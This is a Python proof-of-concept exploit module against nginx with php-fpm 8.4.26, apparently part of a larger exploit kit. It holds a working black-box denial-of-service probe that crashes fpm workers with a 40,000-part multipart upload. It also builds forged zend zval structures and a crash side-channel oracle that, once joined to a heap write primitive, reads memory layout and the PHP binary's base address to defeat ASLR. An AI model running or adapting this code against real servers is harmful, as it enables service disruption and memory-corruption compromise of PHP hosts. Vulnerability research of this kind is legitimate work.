#!/usr/bin/env python3
# INDEX: crash-bit content oracle at chosen address | fpm | needs write and chunk anchor
r"""php-fpm content / mapping oracle: a crash-vs-no-crash signal keyed on the
value at an attacker-CHOSEN address A, with no application serialize()/reflect
sink. Reading that bit over many probes recovers bytes (binbase).

The app-free page-probe crash oracle gives only a 1-bit LIVENESS signal (a
mid-request fault -> nginx 502 / reset / "upstream sent unexpected FastCGI
record", versus a 200). This module steers a core-engine dereference at a chosen
address A so that whether the worker dies becomes a function of the value/mapping
at A.

Two sub-oracles (both verified value-dependent at the engine level under gdb):

  (M) MAPPING / MAGNITUDE oracle  --  forged zend_string length read.
      Plant a fake zval {type=IS_STRING, value.ptr = A-0x18} so a plain core
      string op (e.g. strtoupper) treats A-0x18 as a zend_string: it reads
      len = *(size_t*)(A-0x8) and streams `len` bytes from A.
        * A region unmapped        -> reading len (or the bytes) faults  -> CRASH
        * len small, A..A+len mapped                                     -> SURVIVE
        * len huge (off the mapping / an emalloc(len) that aborts)       -> CRASH
      So SURVIVE<=>(*(A-8) is a small in-bounds length AND A is mapped). Swept
      over A this walks mapping EDGES (the 2 MiB-aligned zend_mm chunk boundary,
      the php-fpm PIE LOAD segments) and reads a coarse magnitude bit of *(A-8).

  (P) POINTER oracle  --  forged IS_ARRAY indirection.
      Plant a fake zval {type=IS_ARRAY, value.ptr = A} so the engine treats A as
      a zend_array*, loads arData = *(A+0x10) and walks buckets:
        * *(A+0x10) a mapped pointer      -> SURVIVE
        * *(A+0x10) not a valid pointer   -> CRASH
      i.e. one is-this-qword-a-live-pointer bit of *(A+0x10) per probe. Sweeping
      the known-layout chunk interior finds the slot holding a php-fpm image
      pointer -> binbase, with no reflection channel.

PRECONDITIONS:
  * The app-free LIVENESS bit runs STANDALONE black-box against any fpm target.
  * Making the oracle value-dependent needs (1) a write that plants the fake zval
    at a known heap address and (2) a chosen absolute address A. On fpm neither
    is available app-free (its only arbitrary write is var_unserializer steering,
    whose 16-byte ZVAL_COPY needs the zend_mm chunk base). So the content oracle
    is NOT self-bootstrapping on fpm: it COMPOSES with an existing write + chunk
    anchor (a write primitive + a chunk seed), replacing an app
    serialize()-reflect read sink with a crash side-channel. Once anchored it
    boundary-walks (fork-stable fpm ASLR keeps the target fixed across respawns)
    and reads binbase. Verified on nginx->php-fpm 8.4.26.

Pure stdlib, python3 -I safe. The CONTENT sub-oracles are exposed as composable
primitives taking a `plant`/`fire` write+trigger callback and a `liveness` probe
callback, so they wire onto a caller-supplied write+trigger primitive with no
edits to that module.
"""
from __future__ import annotations

import argparse
import os
import re
import struct
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_raw import exchange as _exchange  # noqa: E402

# minimal, dependency-free HTTP transport (the oracle only needs a status/body
# and a connection-died signal)
_BOUNDARY = b"----fpmcontentoracle3f"


def _parse(base):
    u = base
    if u.startswith("http://"):
        u = u[7:]
    elif u.startswith("https://"):
        u = u[8:]
    path = "/"
    if "/" in u:
        u, rest = u.split("/", 1)
        path = "/" + rest
    host, port = u, 80
    if ":" in u:
        host, p = u.rsplit(":", 1)
        port = int(p)
    return host, port, path


def _raw(host, port, method, path, headers=None, body=b"", timeout=25):
    """One HTTP/1.1 request on a fresh socket. Returns (status|None, body,
    transport_error|None). A transport error / missing status after a POST is
    itself the crash signal."""
    headers = dict(headers or {})
    headers.setdefault("Host", host)
    headers.setdefault("Connection", "close")
    if body:
        headers["Content-Length"] = str(len(body))
    req = ("%s %s HTTP/1.1\r\n" % (method, path)).encode()
    for k, v in headers.items():
        req += ("%s: %s\r\n" % (k, v)).encode()
    req += b"\r\n"
    resp, cerr, ierr = _exchange(host, port, req + body, timeout=timeout)
    if cerr is not None:
        return None, b"", "connect: %r" % (cerr,)
    terr = "io: %r" % (ierr,) if ierr is not None else None
    head, _, rest = resp.partition(b"\r\n\r\n")
    status = None
    first = head.split(b"\r\n", 1)[0].split(b" ")
    if len(first) >= 2 and first[1].isdigit():
        status = int(first[1])
    return status, rest, terr


# the app-free LIVENESS oracle (the bit this module upgrades): the page-probe
# crash oracle, app-agnostic but leak-free on its own.
def worker_alive(base, timeout=8):
    """True iff a bare GET returns 200 (worker up)."""
    host, port, path = _parse(base)
    st, _b, _e = _raw(host, port, "GET", path if path != "/" else "/index.php",
                      timeout=timeout)
    return st == 200


def _many_file_parts(nparts=40000, partsz=8):
    """A pure-multipart body of `nparts` tiny file parts. App-free: the fpm
    worker OOMs mid-startup building $_FILES. Empirically (8.4.26) this is the
    strongest app-agnostic liveness differential."""
    out = bytearray()
    for i in range(nparts):
        out += b"--" + _BOUNDARY + (
            b'\r\nContent-Disposition: form-data; name="f%d"; '
            b'filename="a"\r\nContent-Type: text/plain\r\n\r\n' % i) + b"A" * partsz + b"\r\n"
    out += b"--" + _BOUNDARY + b"--\r\n"
    ctype = b"multipart/form-data; boundary=" + _BOUNDARY
    return bytes(out), ctype


def liveness_probe(base, nparts=40000, timeout=60):
    """Fire the app-free OOM and report whether the worker was observably
    disturbed (died / respawned). Returns a dict. This is the 1-bit signal;
    it is NOT keyed on any chosen address (that is the content oracle below)."""
    host, port, path = _parse(base)
    before = worker_alive(base)
    body, ctype = _many_file_parts(nparts)
    st, rbody, terr = _raw(host, port, "POST",
                           path if path.endswith(".php") else "/index.php",
                           {"Content-Type": ctype.decode()}, body, timeout=timeout)
    after = worker_alive(base)
    # On fpm a startup OOM is surfaced black-box either as a dropped/short body
    # or a 502/reset; the worker then respawns (fork-stable ASLR).
    size_leak = re.findall(rb"tried to allocate (\d+)", rbody)
    return {
        "oracle": "app-free liveness bit (page-probe crash oracle)",
        "worker_before": before,
        "probe_status": st,
        "transport_error": terr,
        "worker_after": after,
        "oom_size_reflected": [int(x) for x in size_leak],  # a SIZE, never a ptr
        "leaks_pointer": False,
        "value_dependent": False,
        "note": "liveness/size only; not keyed on a chosen address",
    }


# CONTENT oracle: forged-zval payload builders + the steering logic.
# These produce the BYTES to plant at a known heap address; a caller's write
# primitive places them and fires the trigger, and a liveness callback reports
# crash-vs-survive. The crash is value-dependent on `addr`.
IS_STRING = 0x06
IS_ARRAY = 0x07
ZSTR_VAL = 0x18          # zend_string: gc@0 h@8 len@0x10 val@0x18
HT_ARDATA = 0x10         # zend_array: ... arData@0x10


def p64(x):
    return struct.pack("<Q", x & (2**64 - 1))


def p32(x):
    return struct.pack("<I", x & (2**32 - 1))


def forge_string_zval(addr):
    """A 16-byte zval {value.ptr = addr-0x18, type_info = IS_STRING}.

    When the engine performs a plain string read on it, it fetches
    len = *(size_t*)(addr-8) and streams `len` bytes from `addr`. Outcome:
       addr unmapped -> fault reading len               -> CRASH
       len small, addr..addr+len mapped                 -> SURVIVE
       len huge (runs off map / emalloc(len) aborts)    -> CRASH
    So SURVIVE encodes (addr mapped) AND (*(addr-8) a small in-bounds length).
    """
    return p64(addr - ZSTR_VAL) + p32(IS_STRING) + p32(0xFFFFFFFF)


def forge_array_zval(addr):
    """A 16-byte zval {value.ptr = addr, type_info = IS_ARRAY}.

    The engine treats addr as zend_array*, loads arData = *(addr+0x10) and
    dereferences it to walk buckets. Outcome:
       *(addr+0x10) a mapped pointer   -> SURVIVE
       *(addr+0x10) not a valid ptr    -> CRASH
    i.e. one is-this-qword-a-pointer bit of *(addr+0x10) per probe.
    """
    return p64(addr) + p32(IS_ARRAY) + p32(0)


class ContentOracle:
    """Value-dependent crash oracle over an injected write+trigger+liveness.

    plant(addr, payload16)  -> place the 16-byte forged zval at a known heap
                               address `slot` (the caller's write), then
    fire()                  -> trigger the core op that dereferences it, then
    liveness()              -> True if the worker survived, False if it died.

    `slot` is the known heap location (needs the chunk anchor). `addr` is the
    chosen absolute probe address. Both come from the composed write primitive;
    see the module docstring for why neither is available app-free on fpm.
    """

    def __init__(self, plant, fire, liveness, settle=0.2):
        self._plant = plant
        self._fire = fire
        self._liveness = liveness
        self.settle = settle
        self.requests = 0

    def _probe(self, slot, payload):
        self._plant(slot, payload)
        self._fire()
        self.requests += 1
        if self.settle:
            time.sleep(self.settle)
        return self._liveness()   # True == survived

    def magnitude_bit(self, slot, addr):
        """SURVIVE<=>(addr mapped AND *(addr-8) is a small in-bounds length).
        Returns True on survive (the 'low magnitude / mapped' half)."""
        return self._probe(slot, forge_string_zval(addr))

    def pointer_bit(self, slot, addr):
        """SURVIVE<=> *(addr+0x10) is a live mapped pointer. Returns True on
        survive (the 'is a pointer' half)."""
        return self._probe(slot, forge_array_zval(addr))

    def mapping_edge(self, slot, lo, hi, step=0x1000):
        """Boundary-walk [lo, hi) with the magnitude oracle to find the first
        address whose probe flips survive->crash: a mapping edge (e.g. the end
        of the 2 MiB zend_mm chunk, or a php-fpm LOAD-segment boundary).
        Returns the edge address or None. Cost: (hi-lo)/step probes."""
        prev = None
        a = lo
        while a < hi:
            alive = self.magnitude_bit(slot, a)
            if prev is not None and prev and not alive:
                return a
            prev = alive
            a += step
        return None


# cost model (closed form)
def cost_model(chunk_size=2 * 1024 * 1024, page=0x1000):
    """Requests to recover binbase once an anchor (chunk base) is held.

    - pointer_bit is 1 bit/request (is-pointer vs not).
    - The php-fpm image pointer lives at a KNOWN chunk-relative slot in the
      payload geometry (OBJ_CHUNK_OFF + fixed object offset), so with the anchor
      you do NOT scan the whole chunk: you read the 6 significant bytes of that
      one pointer. The oracle gives bit/magnitude signals, not raw bytes, so
      recovering a full 48-bit pointer by the crash side-channel needs a
      bisection per byte (~8 probes/byte via the magnitude oracle against a
      groomed length) ~= 48 probes for the pointer, + boundary-walk confirmation.
    - Without the known slot (pure discovery), a full chunk mapping-walk is
      chunk_size/page = 512 probes/chunk; finding the PIE from the chunk by
      walking the address space in 2 MiB strides is infeasible from nothing
      (~2^25 strides) -> the anchor is required.
    """
    return {
        "bits_per_request": 1,
        "mapping_walk_probes_per_chunk": chunk_size // page,     # 512
        "binbase_via_known_slot_probes": 48 + 8,                 # ~1 pointer + edge
        "requires_anchor": True,
        "anchor_source_app_free_on_fpm": False,
    }


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url", nargs="?", default="http://127.0.0.1:8150/",
                    help="fpm target base URL")
    ap.add_argument("--liveness", action="store_true",
                    help="run the app-free liveness bit (black-box, standalone)")
    ap.add_argument("--nparts", type=int, default=40000)
    ap.add_argument("--cost", action="store_true", help="print the cost model")
    args = ap.parse_args(argv)

    import json
    if args.cost:
        print(json.dumps(cost_model(), indent=2))
        return 0
    if args.liveness:
        print(json.dumps(liveness_probe(args.url, nparts=args.nparts), indent=2))
        return 0
    print(json.dumps({
        "module": "fpm_content_oracle",
        "liveness_oracle": "app-free, standalone (--liveness)",
        "content_oracle": "ContentOracle(plant, fire, liveness) - composes "
                          "with var_hash_rw/a7 (needs write + chunk anchor)",
        "value_dependence_proven": "verify_fpm_content_oracle.py (gdb, live 8.4.26)",
        "cost": cost_model(),
    }, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
